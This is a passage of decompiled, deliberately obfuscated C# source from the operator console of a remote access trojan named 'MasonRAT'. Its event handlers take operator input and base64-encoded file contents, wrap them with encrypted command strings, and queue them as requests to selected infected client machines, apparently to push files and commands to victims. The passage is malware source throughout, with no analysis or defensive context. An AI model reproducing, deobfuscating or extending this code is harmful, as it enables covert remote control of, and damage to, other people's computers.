\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)];
          strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1504);
          strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
          strArray[((1829692535 > 1844420959 ? 1431120092 : 1073340069) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ (1844372288 - 776799552 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 | -705555345 - -839354424 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << (0 ^ 0)] = Convert.ToBase64String(File.ReadAllBytes(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1505)));
          strArray[(1356240469 - 1552005822 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + (1819570726 + -1623805370 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) % ((470239609 > 789160439 ? 1950089314 : 1462566986) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0 + 0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
          strArray[(-1308634419 - (495764279 | 2112848570) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - (2036423928 - 1162956270 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 << 1)] = Convert.ToBase64String(File.ReadAllBytes(openFileDialog1.FileName));
          byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
          try
          {
            foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
            {
              Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
              Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
            }
          }
          finally
          {
            IEnumerator enumerator;
            if (enumerator is IDisposable)
              (enumerator as IDisposable).Dispose();
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cد\u060Bټؤ\u060B\u060Dبـ\u060A\u0020ى(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string DefaultResponse1 = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1506);
    string str1 = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1507), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1508), DefaultResponse1, ((904420440 ^ -1251443624) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + ((523673566 ^ 24) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 | 726615227 + (325128900 << 2110123932) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1), (1917535725 + 1344306460 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) + ((585084092 ^ 525045834 % 1411609432) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 >> 1));
    string DefaultResponse2 = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1509);
    string str2 = Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1510), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1511), DefaultResponse2, (1721644749 + 1740578115 % 1349912738 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) - (1030115230 - (140463922 >> 11480529) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 | (2095137101 ^ 123635012 << 457456254) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + (0 + 0), ((95276129 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 ^ -(1236771408 - 1141495257 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1));
    if (!(str1.Length == 0 | str2.Length == 0))
    {
      string[] strArray = new string[(537919558 + (1403775902 | 1609454635) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0) - (778481754 + 611017931 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << ((1086236910 ^ 1932070024 >> 1220744547) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 ^ 0)];
      strArray[0] = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1512);
      strArray[1] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[(1812816291 - -1578157557 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 ^ -(-179182595 - ~1083176040 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0)] = str2;
      strArray[-884623363 - (353012643 << 345247103) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 - (14570149 + 1248290133 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + -0] = Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ;
      strArray[((-1166088639 ^ (1188361790 | 2050921721)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - -((736397404 ^ 1634154284 % 1355534354) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0] = str1;
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(string.Concat(strArray));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cــد\u0608ط\u060C\u0608\u060Fـ̨(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1513), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1514), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1515), (826105210 - 629994461 % 308173544 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) - (559110541 + ~152881621 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 << ((461739307 ^ 10) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 >> 1), -1135504008 - 858905622 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0 + ((1994409631 ^ 2) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - (0 << 1));
    if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1516) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right)));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cـة\u060Eـۨـ\u0608ڙـح\u060Dـ(object sender, EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    object Right = (object) Interaction.InputBox(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1517), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1518), \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1519), ((-373961246 ^ 1497777071 >> 2127798309) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 ^ ((1333959084 | 176117701) - 307024836 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0) << (290409150 << 70848773) - 373486537 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0 + 0, (485968159 + 925199907 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - 0 ^ -(12367683 - (1430696576 << 424960206) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> (0 ^ 0));
    if (!string.IsNullOrWhiteSpace(Conversions.ToString(Right)))
    {
      byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(Conversions.ToString(Operators.ConcatenateObject((object) (\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1520) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ), Right)));
      try
      {
        foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
        {
          Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
          Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }
  }

  private void \u2694️MasonRAT\u270Cد\u060B\u060Eڙـۡ\u060Aـ\u0608\u060D\u0020ﻋڼـٸ\u0609(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    byte[] B_ = Helper.\u2694️MasonRAT\u270Cڟڙ\u060Dٺ\u060B\u0608ـگــڛـ\u060Eـ(\u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1521) + Settings.\u2694️MasonRAT\u270Cۙ\u060E\u060A\u060Fڜ\u060Aڙ\u060Aﻼـ + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1522));
    try
    {
      foreach (ListViewItem selectedItem in this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems)
      {
        Outcoming_Requests outcomingRequests = new Outcoming_Requests((Client) selectedItem.Tag, B_);
        Pending.\u2694️MasonRAT\u270Cۙـ\u060A\u0608\u060Fئـ̍\u0609ּٸ\u0020ۜ\u060A\u060F.Add(outcomingRequests);
      }
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
  }

  private void \u2694️MasonRAT\u270C\u0609ڟ\u060B\u0020ـ\u0609ټـ\u060A\u060D\u060Bۙ\u060F\u060Fﮪؤڙ\u060Fة(
    object sender,
    EventArgs e)
  {
    if (this.\u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A.SelectedItems.Count <= 0)
      return;
    string DefaultResponse = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 1523);
